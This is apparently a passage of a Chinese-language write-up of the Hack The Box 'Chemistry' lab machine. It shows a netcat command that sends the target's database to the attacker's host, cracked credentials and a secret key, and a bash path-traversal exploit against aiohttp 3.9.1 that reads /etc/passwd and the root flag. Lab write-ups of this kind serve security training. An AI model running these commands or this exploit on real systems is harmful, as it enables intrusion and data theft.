site.frac_coords[<span class="number">0</span>],</span><br><span class="line">            <span class="string">&#x27;y&#x27;</span>: site.frac_coords[<span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;z&#x27;</span>: site.frac_coords[<span class="number">2</span>]</span><br><span class="line">        &#125; <span class="keyword">for</span> site <span class="keyword">in</span> structure.sites]</span><br><span class="line">        </span><br><span class="line">        lattice = structure.lattice</span><br><span class="line">        lattice_data = &#123;</span><br><span class="line">            <span class="string">&#x27;a&#x27;</span>: lattice.a,</span><br><span class="line">            <span class="string">&#x27;b&#x27;</span>: lattice.b,</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>: lattice.c,</span><br><span class="line">            <span class="string">&#x27;alpha&#x27;</span>: lattice.alpha,</span><br><span class="line">            <span class="string">&#x27;beta&#x27;</span>: lattice.beta,</span><br><span class="line">            <span class="string">&#x27;gamma&#x27;</span>: lattice.gamma,</span><br><span class="line">            <span class="string">&#x27;volume&#x27;</span>: lattice.volume</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        density = calculate_density(structure)</span><br><span class="line">        </span><br><span class="line">        structure_data.append(&#123;</span><br><span class="line">            <span class="string">&#x27;formula&#x27;</span>: structure.formula,</span><br><span class="line">            <span class="string">&#x27;lattice&#x27;</span>: lattice_data,</span><br><span class="line">            <span class="string">&#x27;density&#x27;</span>: density,</span><br><span class="line">            <span class="string">&#x27;sites&#x27;</span>: sites</span><br><span class="line">        &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;structure.html&#x27;</span>, structures=structure_data)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete_structure/&lt;identifier&gt;&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_structure</span>(<span class="params">identifier</span>):</span><br><span class="line">    structure = Structure.query.filter_by(identifier=identifier, user_id=current_user.<span class="built_in">id</span>).first_or_404()</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], structure.identifier + <span class="string">&#x27;_&#x27;</span> + structure.filename)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    db.session.delete(structure)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        db.create_all()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+<p><code>MyS3cretCh3mistry4PP</code> 這可能是 sqllite 的密碼 <del>但其實沒用到</del><br><img src="https://hackmd.io/_uploads/HJdSrCdIJg.png" alt="image"><br><del>有個奇怪檔案應該是別人弄出來的不用管</del><br>把db下載到local</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># remote</span></span><br><span class="line">app@chemistry:~$ nc 10.10.14.20 9002 &lt; instance/database.db     </span><br><span class="line">nc 10.10.14.20 9002 &lt; instance/database.db</span><br><span class="line"><span class="comment"># local</span></span><br><span class="line">└─$ nc -lvnp 9002  &gt; database.db</span><br><span class="line">listening on [any] 9002 ...</span><br><span class="line">connect to [10.10.14.20] from (UNKNOWN) [10.10.11.38] 58458</span><br></pre></td></tr></table></figure>
+<p><del>其實可以在 shell 開 python http.server</del><br>kali 開個分頁 <code>ls -l</code> 確認 database.db 的大小沒錯，傳送完了，就手動斷開連接<br>直接雙擊打開<br><img src="https://hackmd.io/_uploads/BkgPPxY8ye.png" alt="image"><br>用test的hash測試，是 MD5<br><img src="https://hackmd.io/_uploads/Hk-jPetLJx.png" alt="image"><br>hash.txt <code>63ed86ee9f624c7b14f1d4f43dc251a5</code><br><img src="https://hackmd.io/_uploads/rJryKeK8Jl.png" alt="image"><br><code>rosa:unicorniosrosados</code><br>ssh成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ ssh rosa@10.10.11.38</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Sksf9eYU1x.png" alt="image"></p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h4><p><img src="https://hackmd.io/_uploads/HkWDHWt81l.png" alt="image"><br>奇怪的 port 8080<br><img src="https://hackmd.io/_uploads/r1tvx-c8kx.png" alt="image"><br>curl 一下發現好像是個網站<br>把 8080 port 轉發到 kali 8002 port，方便進行枚舉，並且 8080 port 是 burpsuite 預設 port</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">└─$ ssh -L 8002:127.0.0.1:8080 rosa@10.10.11.38</span><br></pre></td></tr></table></figure>
+<p>轉發成功<br><img src="https://hackmd.io/_uploads/B1yFXZqLkx.png" alt="image"><br><img src="https://hackmd.io/_uploads/rk8LV-581e.png" alt="image"><br>有個 servise aiohttp<br>瀏覽器開啟來看沒有其他 path 或有用的東西<br><img src="https://hackmd.io/_uploads/H1TXrW5Uyg.png" alt="image"><br>dirseach 也沒有可以讀的 path<br><img src="https://hackmd.io/_uploads/ByS_BZ5Ikl.png" alt="image"></p>
+<h4 id="exloitation"><a href="#exloitation" class="headerlink" title="exloitation"></a>exloitation</h4><p>google <code>aiohttp/3.9.1 exploit</code><br><img src="https://hackmd.io/_uploads/SJf5yM5L1g.png" alt="image"><br><img src="https://hackmd.io/_uploads/HyZExG9Iyg.png" alt="image"><br>複製其中的 <code>exploit.sh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://localhost:8002&quot;</span></span><br><span class="line">string=<span class="string">&quot;../&quot;</span></span><br><span class="line">payload=<span class="string">&quot;/static/&quot;</span></span><br><span class="line">file=<span class="string">&quot;etc/passwd&quot;</span> <span class="comment"># without the first /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>; i&lt;<span class="number">15</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    payload+=<span class="string">&quot;<span class="variable">$string</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[+] Testing with $payload<span class="variable">$file</span>&quot;</span></span><br><span class="line">    status_code=$(curl --path-as-is -s -o /dev/null -w <span class="string">&quot;%&#123;http_code&#125;&quot;</span> <span class="string">&quot;$url$payload<span class="variable">$file</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\tStatus code --&gt; <span class="variable">$status_code</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$status_code</span> -eq 200 ]]; <span class="keyword">then</span></span><br><span class="line">        curl -s --path-as-is <span class="string">&quot;$url$payload<span class="variable">$file</span>&quot;</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HkpZBzcUyg.png" alt="image"><br>但是都404<br>因為其實沒有 <code>/static</code> path<br><img src="https://hackmd.io/_uploads/SJZ5YMcIJe.png" alt="image"><br>改用 <code>/assets</code> &#x3D;&gt; <code>payload=&quot;/assets/&quot;</code><br><img src="https://hackmd.io/_uploads/SkqtcG5Uyx.png" alt="image"><br>發現它有 root 權限<br><img src="https://hackmd.io/_uploads/B1QTpGqLyx.png" alt="image"><br>直接讀flag<br><img src="https://hackmd.io/_uploads/B1610zcUJx.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tag/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chemistry"><span class="toc-number">1.</span> <span class="toc-text">Chemistry</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.2.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">1.3.</span> <span class="toc-text">Lateral Movement</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumeration-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exloitation"><span class="toc-number">1.4.2.</span> <span class="toc-text">exloitation</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/07/HTB-Chemistry/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/07/HTB-Chemistry/&text=HTB Chemistry"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/07/HTB-Chemistry/&is_video=false&description=HTB Chemistry"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Chemistry&body=Check out this article: http://example.com/2025/01/07/HTB-Chemistry/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/07/HTB-Chemistry/&name=HTB Chemistry&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/07/HTB-Chemistry/&t=HTB Chemistry"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    wang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
